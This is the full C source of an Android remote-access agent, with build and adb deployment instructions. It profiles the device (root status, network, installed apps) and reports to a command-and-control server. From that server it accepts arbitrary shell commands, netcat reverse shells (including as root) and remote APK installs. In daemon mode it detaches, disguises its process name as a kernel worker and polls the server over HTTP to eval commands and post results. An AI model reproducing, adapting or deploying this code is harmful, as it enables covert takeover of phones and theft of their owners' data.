/*
 * secV on-device persistent recon/C2 agent v2.0
 *
 * Modes:
 *   recon   — gather device info, send to C2 once, exit
 *   exploit — send report, receive one instruction, execute it
 *   daemon  — daemonize, hide process, loop reconnect forever
 *             TCP path (LAN)  : direct socket → send report → recv cmd
 *             HTTP path (WAN) : nc-based HTTP poll loop (works over SIM/NAT)
 *
 * Build (with NDK):
 *   $NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android34-clang \
 *       -O2 -static -fstack-protector-strong -o secv_agent secv_agent.c
 *
 * Build (without NDK — aarch64-linux-gnu cross-gcc):
 *   aarch64-linux-gnu-gcc -O2 -static -fstack-protector-strong \
 *       -DUSE_POPEN_PROP -o secv_agent secv_agent.c
 *
 * Deploy:
 *   adb push secv_agent /data/local/tmp/._sa
 *   adb shell chmod 755 /data/local/tmp/._sa
 *   adb shell /data/local/tmp/._sa 192.168.1.100 8889 recon
 *   adb shell /data/local/tmp/._sa 192.168.1.100 8889 8890 daemon
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <time.h>

/* Android NDK provides __system_property_get; plain gcc cross does not.
 * When USE_POPEN_PROP is defined (cross-gcc build) we use popen("getprop") */
#if defined(__ANDROID__) && !defined(USE_POPEN_PROP)
  #include <sys/system_properties.h>
  static void get_prop(const char *key, char *val, size_t sz) {
      __system_property_get(key, val);
      (void)sz;
  }
#else
  /* Works on any Android via the getprop command */
  static void get_prop(const char *key, char *val, size_t sz) {
      char cmd[256];
      snprintf(cmd, sizeof(cmd), "getprop '%s' 2>/dev/null", key);
      FILE *fp = popen(cmd, "r");
      if (!fp) { val[0] = '\0'; return; }
      size_t n = fread(val, 1, sz - 1, fp);
      pclose(fp);
      val[n] = '\0';
      char *nl = strchr(val, '\n');
      if (nl) *nl = '\0';
  }
  #ifndef PROP_VALUE_MAX
  #define PROP_VALUE_MAX 92
  #endif
#endif

#include <sys/prctl.h>

#define PROP(k, v)   get_prop(k, v, sizeof(v))
#define JSON_SIZE    16384
#define CMD_SIZE     4096
#define PID_FILE     "/data/local/tmp/._svp"
#define HTTP_POLL_SH "/data/local/tmp/._svh.sh"

static char json_buf[JSON_SIZE];
static char cmd_buf[CMD_SIZE];

/* ── helpers ── */
static int readfile(const char *path, char *buf, size_t sz) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, sz - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    char *nl = strchr(buf, '\n');
    if (nl) *nl = '\0';
    return (int)n;
}

static int runcmd(const char *cmd, char *out, size_t outsz) {
    FILE *fp = popen(cmd, "r");
    if (!fp) { if (out) out[0] = '\0'; return -1; }
    size_t n = 0;
    if (out) {
        n = fread(out, 1, outsz - 1, fp);
        out[n] = '\0';
        for (ssize_t i = (ssize_t)n - 1;
             i >= 0 && (out[i] == '\n' || out[i] == '\r'); i--)
            out[i] = '\0';
    }
    pclose(fp);
    return (int)n;
}

static void json_esc(char *buf, size_t sz) {
    char tmp[JSON_SIZE] = {0};
    size_t j = 0;
    for (size_t i = 0; buf[i] && j < sz - 2; i++) {
        if (buf[i] == '"' || buf[i] == '\\') tmp[j++] = '\\';
        tmp[j++] = buf[i];
    }
    strncpy(buf, tmp, sz - 1);
    buf[sz - 1] = '\0';
}

static int fexists(const char *path) { return access(path, F_OK) == 0; }

/* TCP connect — returns fd or -1 */
static int tcp_connect(const char *host, int port) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;

    /* 8s connect timeout via alarm */
    struct timeval tv = {8, 0};
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family      = AF_INET;
    sa.sin_port        = htons((uint16_t)port);
    sa.sin_addr.s_addr = inet_addr(host);
    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(fd);
        return -1;
    }
    return fd;
}

/* ── build JSON report ── */
static void build_json(const char *mode) {
    char model[PROP_VALUE_MAX]   = {0};
    char mfr[PROP_VALUE_MAX]     = {0};
    char android[PROP_VALUE_MAX] = {0};
    char sdk[PROP_VALUE_MAX]     = {0};
    char patch[PROP_VALUE_MAX]   = {0};
    char chipset[PROP_VALUE_MAX] = {0};
    char arch[PROP_VALUE_MAX]    = {0};
    char bootlocked[16]          = {0};
    char build[256]              = {0};

    PROP("ro.product.model",                 model);
    PROP("ro.product.manufacturer",          mfr);
    PROP("ro.build.version.release",         android);
    PROP("ro.build.version.sdk",             sdk);
    PROP("ro.build.version.security_patch",  patch);
    PROP("ro.board.platform",                chipset);
    PROP("ro.product.cpu.abi",               arch);
    PROP("ro.boot.flash.locked",             bootlocked);
    PROP("ro.build.fingerprint",             build);

    char kernel[128] = {0};
    readfile("/proc/version", kernel, sizeof(kernel));

    /* root detection */
    const char *su_paths[] = {
        "/system_ext/bin/su", "/debug_ramdisk/su", "/system/bin/su",
        "/system/xbin/su",    "/data/adb/magisk/su", "/sbin/su", NULL
    };
    char root_status[256] = "none";
    char root_bin[128]    = {0};
    for (int i = 0; su_paths[i]; i++) {
        if (fexists(su_paths[i])) {
            char tc[256], to[64] = {0};
            snprintf(tc, sizeof(tc), "%s -c id 2>/dev/null", su_paths[i]);
            runcmd(tc, to, sizeof(to));
            if (strstr(to, "uid=0")) {
                strncpy(root_status, "rooted",   sizeof(root_status) - 1);
                strncpy(root_bin,    su_paths[i], sizeof(root_bin) - 1);
                break;
            }
        }
    }
    if (runcmd("pgrep -x magiskd >/dev/null 2>&1 && echo 1", NULL, 0) == 0)
        strncat(root_status, "|magiskd", sizeof(root_status) - strlen(root_status) - 1);
    if (fexists("/dev/ksud") || fexists("/data/adb/ksud"))
        strncat(root_status, "|kernelsu", sizeof(root_status) - strlen(root_status) - 1);

    /* SELinux */
    char selinux[32] = "unknown";
    readfile("/sys/fs/selinux/enforce", selinux, sizeof(selinux));
    if (selinux[0] == '1')       strncpy(selinux, "Enforcing",  sizeof(selinux) - 1);
    else if (selinux[0] == '0')  strncpy(selinux, "Permissive", sizeof(selinux) - 1);

    /* network */
    char ip[64] = {0}, gw[64] = {0}, ports[256] = {0}, adb_tcp[16] = {0};
    runcmd("ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1 | head -1", ip, sizeof(ip));
    if (!ip[0])
        runcmd("ip route get 1.1.1.1 2>/dev/null | awk '/src/{for(i=1;i<=NF;i++) if($i==\"src\") print $(i+1)}'", ip, sizeof(ip));
    /* also check rmnet0 (mobile data) */
    if (!ip[0])
        runcmd("ip addr show rmnet0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1 | head -1", ip, sizeof(ip));
    runcmd("ip route 2>/dev/null | grep default | awk '{print $3}' | head -1", gw, sizeof(gw));
    runcmd("ss -tlnp 2>/dev/null | awk 'NR>1{split($4,a,\":\");if(a[2]+0>0)printf a[2]\",\"}'", ports, sizeof(ports));
    PROP("service.adb.tcp.port", adb_tcp);

    /* packages */
    char pkgs_count[16] = {0}, pkgs[2048] = {0};
    runcmd("pm list packages 2>/dev/null | wc -l",                               pkgs_count, sizeof(pkgs_count));
    runcmd("pm list packages -3 2>/dev/null | cut -d: -f2 | tr '\\n' ',' | sed 's/,$//'", pkgs, sizeof(pkgs));

    /* termux */
    int has_termux = fexists("/data/data/com.termux");

    /* escape */
    json_esc(model,   sizeof(model));
    json_esc(kernel,  sizeof(kernel));
    json_esc(build,   sizeof(build));
    json_esc(pkgs,    sizeof(pkgs));

    snprintf(json_buf, sizeof(json_buf),
        "{"
        "\"agent\":\"secV_native/2.0\","
        "\"mode\":\"%s\","
        "\"device\":{"
            "\"model\":\"%s\",\"manufacturer\":\"%s\","
            "\"android\":\"%s\",\"sdk\":%s,"
            "\"security_patch\":\"%s\",\"chipset\":\"%s\","
            "\"arch\":\"%s\",\"kernel\":\"%s\","
            "\"root\":\"%s\",\"root_bin\":\"%s\","
            "\"selinux\":\"%s\",\"bootlocked\":\"%s\","
            "\"build\":\"%s\""
        "},"
        "\"network\":{"
            "\"ip\":\"%s\",\"gateway\":\"%s\","
            "\"adb_tcp_port\":\"%s\",\"open_ports\":\"%s\""
        "},"
        "\"packages\":{\"count\":%s,\"third_party\":\"%s\"},"
        "\"attack_surface\":{"
            "\"termux\":%s"
        "}"
        "}",
        mode,
        model, mfr, android, sdk,
        patch, chipset, arch, kernel,
        root_status, root_bin, selinux, bootlocked, build,
        ip, gw, adb_tcp, ports,
        pkgs_count, pkgs,
        has_termux ? "true" : "false"
    );
}

/* ── execute C2 instruction ── */
static void execute_cmd(const char *cmd_start, const char *root_bin) {
    if (strncmp(cmd_start, "SH:", 3) == 0) {
        system(cmd_start + 3);

    } else if (strncmp(cmd_start, "SHELL:", 6) == 0) {
        char addr[256];
        strncpy(addr, cmd_start + 6, sizeof(addr) - 1);
        char *col = strrchr(addr, ':');
        if (col) *col = ' ';
        char rev[512];
        snprintf(rev, sizeof(rev),
            "f=$(mktemp /data/local/tmp/._svXXXXXX 2>/dev/null || echo /data/local/tmp/._sv$$) && "
            "rm -f \"$f\" 2>/dev/null && mkfifo \"$f\" 2>/dev/null && "
            "/system/bin/sh -i <\"$f\" | nc %s >\"$f\" 2>/dev/null; rm -f \"$f\" 2>/dev/null",
            addr);
        system(rev);

    } else if (strncmp(cmd_start, "ROOT_SHELL:", 11) == 0 && root_bin && root_bin[0]) {
        char addr[256];
        strncpy(addr, cmd_start + 11, sizeof(addr) - 1);
        char *col = strrchr(addr, ':');
        if (col) *col = ' ';
        char rev[512];
        snprintf(rev, sizeof(rev),
            "%s -c \""
            "f=\\$(mktemp /data/local/tmp/._svXXXXXX 2>/dev/null || echo /data/local/tmp/._sv$$) && "
            "rm -f \\\"\\$f\\\" 2>/dev/null && mkfifo \\\"\\$f\\\" 2>/dev/null && "
            "/system/bin/sh -i <\\\"\\$f\\\" | nc %s >\\\"\\$f\\\" 2>/dev/null; "
            "rm -f \\\"\\$f\\\" 2>/dev/null\"",
            root_bin, addr);
        system(rev);

    } else if (strncmp(cmd_start, "APK:", 4) == 0) {
        const char *url = cmd_start + 4;
        char apk_cmd[512];
        snprintf(apk_cmd, sizeof(apk_cmd),
            "curl -sf -o /data/local/tmp/._secv_p.apk '%s' 2>/dev/null && "
            "pm install -r -t /data/local/tmp/._secv_p.apk 2>/dev/null",
            url);
        system(apk_cmd);
    }
}

/* ── send report + optional recv command over TCP ── */
static void tcp_session(int fd, const char *mode, const char *root_bin) {
    size_t len = strlen(json_buf);
    write(fd, json_buf, len);
    write(fd, "\n", 1);

    if (strcmp(mode, "exploit") == 0 || strcmp(mode, "c2") == 0 || strcmp(mode, "daemon") == 0) {
        struct timeval tv = {12, 0};
        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        ssize_t n = recv(fd, cmd_buf, sizeof(cmd_buf) - 1, 0);
        if (n > 0) {
            cmd_buf[n] = '\0';
            char *cmd_start = strstr(cmd_buf, "\"cmd\":\"");
            if (cmd_start) {
                cmd_start += 7;
                char *cmd_end = strchr(cmd_start, '"');
                if (cmd_end) {
                    *cmd_end = '\0';
                    execute_cmd(cmd_start, root_bin);
                }
            }
        }
    }
}

/* ── write HTTP polling shell script to disk ── */
static void write_http_poll_sh(const char *c2_host, int http_port) {
    FILE *fp = fopen(HTTP_POLL_SH, "w");
    if (!fp) return;
    fprintf(fp,
        "#!/system/bin/sh\n"
        "C2='%s'; HP='%d'\n"
        "TCURL=/data/data/com.termux/files/usr/bin/curl\n"
        "_curl() { if [ -x \"$TCURL\" ]; then \"$TCURL\" \"$@\"; else curl \"$@\"; fi; }\n"
        "while true; do\n"
        /* HTTP GET /cmd using curl if available, else nc raw HTTP */
        "  if command -v curl >/dev/null 2>&1 || [ -x \"$TCURL\" ]; then\n"
        "    _CMD=$(_curl -sf --connect-timeout 15 --max-time 20 "
              "\"http://$C2:$HP/cmd\" 2>/dev/null)\n"
        "  else\n"
        "    _CMD=$(printf 'GET /cmd HTTP/1.0\\r\\nHost: %s\\r\\n\\r\\n' \"$C2\" | "
              "nc -w10 \"$C2\" \"$HP\" 2>/dev/null | awk '/^\\r?$/{body=1;next} body{print}')\n"
        "  fi\n"
        "  if [ -n \"$_CMD\" ]; then\n"
        "    _OUT=$(eval \"$_CMD\" 2>&1)\n"
        "    if command -v curl >/dev/null 2>&1 || [ -x \"$TCURL\" ]; then\n"
        "      _curl -sf -X POST \"http://$C2:$HP/result\" "
               "-H 'Content-Type: text/plain' --data-binary \"$_OUT\" >/dev/null 2>&1\n"
        "    else\n"
        "      _LEN=${#_OUT}\n"
        "      printf 'POST /result HTTP/1.0\\r\\nHost: %s\\r\\n"
               "Content-Type: text/plain\\r\\nContent-Length: '"
               "'\"$_LEN\"'\\r\\n\\r\\n'"
               "'\"$_OUT\"' | nc -w10 \"$C2\" \"$HP\" >/dev/null 2>&1\n"
        "    fi\n"
        "  fi\n"
        "  sleep 20\n"
        "done\n",
        c2_host, http_port);
    fclose(fp);
    chmod(HTTP_POLL_SH, 0700);
}

/* ── spawn HTTP poll loop as background child ── */
static pid_t spawn_http_poll(const char *c2_host, int http_port) {
    write_http_poll_sh(c2_host, http_port);
    pid_t p = fork();
    if (p != 0) return p;  /* parent returns PID */
    /* child: exec the poll script */
    execl("/system/bin/sh", "sh", HTTP_POLL_SH, NULL);
    _exit(0);
}

/* ── daemon mode ─────────────────────────────────────────────────────── */
static void daemon_mode(const char *c2_host, int c2_port, int http_port) {

    /* double-fork to fully detach from session */
    pid_t p = fork();
    if (p < 0) return;
    if (p > 0) { waitpid(p, NULL, 0); return; }

    setsid();

    p = fork();
    if (p < 0) _exit(0);
    if (p > 0) _exit(0);

    /* redirect I/O to /dev/null */
    int dn = open("/dev/null", O_RDWR);
    if (dn >= 0) {
        dup2(dn, 0); dup2(dn, 1); dup2(dn, 2);
        close(dn);
    }
    umask(0);
    chdir("/");

    /* disguise process name in /proc/<pid>/comm */
    prctl(PR_SET_NAME, "kworker/0:1H", 0, 0, 0);

    /* PID lock file — prevent duplicate daemons */
    int pfd = open(PID_FILE, O_WRONLY | O_CREAT | O_EXCL, 0600);
    if (pfd < 0 && errno == EEXIST) {
        char pb[16] = {0};
        int rfd = open(PID_FILE, O_RDONLY);
        if (rfd >= 0) { read(rfd, pb, sizeof(pb) - 1); close(rfd); }
        pid_t old = (pid_t)atoi(pb);
        if (old > 1 && kill(old, 0) == 0) _exit(0);  /* already running */
        unlink(PID_FILE);
        pfd = open(PID_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    }
    if (pfd >= 0) {
        char pb[16];
        snprintf(pb, sizeof(pb), "%d\n", getpid());
        write(pfd, pb, strlen(pb));
        close(pfd);
    }

    /* gather root_bin once */
    const char *su_paths[] = {
        "/system_ext/bin/su", "/debug_ramdisk/su", "/system/bin/su",
        "/system/xbin/su", "/data/adb/magisk/su", "/sbin/su", NULL
    };
    char root_bin[128] = {0};
    for (int i = 0; su_paths[i]; i++) {
        if (fexists(su_paths[i])) {
            char tc[256], to[64] = {0};
            snprintf(tc, sizeof(tc), "%s -c id 2>/dev/null", su_paths[i]);
            runcmd(tc, to, sizeof(to));
            if (strstr(to, "uid=0")) {
                strncpy(root_bin, su_paths[i], sizeof(root_bin) - 1);
                break;
            }
        }
    }

    /* start HTTP polling child immediately (WAN/SIM always works) */
    pid_t poll_pid = spawn_http_poll(c2_host, http_port);
    (void)poll_pid;

    /* main reconnect loop — TCP preferred, HTTP poll runs in parallel */
    int backoff = 30;
    for (;;) {
        build_json("daemon");
        int fd = tcp_connect(c2_host, c2_port);
        if (fd >= 0) {
            tcp_session(fd, "daemon", root_bin);
            close(fd);
            backoff = 30;
        }
        /* check HTTP poll child still alive, restart if needed */
        if (waitpid(poll_pid, NULL, WNOHANG) == poll_pid)
            poll_pid = spawn_http_poll(c2_host, http_port);

        sleep(backoff);
        if (backoff < 300) backoff += 30;
    }
    /* never reached */
    unlink(PID_FILE);
}

/* ─── main ─────────────────────────────────────────────────────────── */
int main(int argc, char *argv[]) {
    const char *c2_host  = (argc > 1) ? argv[1] : "127.0.0.1";
    int         c2_port  = (argc > 2) ? atoi(argv[2]) : 8889;
    int         http_port = (argc > 3 && atoi(argv[3]) > 0) ? atoi(argv[3]) : c2_port + 1;
    const char *mode     = (argc > 4) ? argv[4] : (argc > 3 && atoi(argv[3]) == 0 ? argv[3] : "recon");

    /* If 4th arg is a word (not a number), it's the mode with default http port */
    if (argc == 4 && atoi(argv[3]) == 0) {
        mode      = argv[3];
        http_port = c2_port + 1;
    }

    if (strcmp(mode, "daemon") == 0) {
        daemon_mode(c2_host, c2_port, http_port);
        return 0;
    }

    /* recon / exploit / c2 — single-shot */
    build_json(mode);
    puts(json_buf);
    fflush(stdout);

    /* gather root_bin for command execution */
    char root_bin[128] = {0};
    const char *su_paths[] = {
        "/system_ext/bin/su", "/debug_ramdisk/su", "/system/bin/su",
        "/system/xbin/su", "/data/adb/magisk/su", "/sbin/su", NULL
    };
    for (int i = 0; su_paths[i]; i++) {
        if (fexists(su_paths[i])) {
            char tc[256], to[64] = {0};
            snprintf(tc, sizeof(tc), "%s -c id 2>/dev/null", su_paths[i]);
            runcmd(tc, to, sizeof(to));
            if (strstr(to, "uid=0")) {
                strncpy(root_bin, su_paths[i], sizeof(root_bin) - 1);
                break;
            }
        }
    }

    int fd = tcp_connect(c2_host, c2_port);
    if (fd >= 0) {
        tcp_session(fd, mode, root_bin);
        close(fd);
    }

    return 0;
}
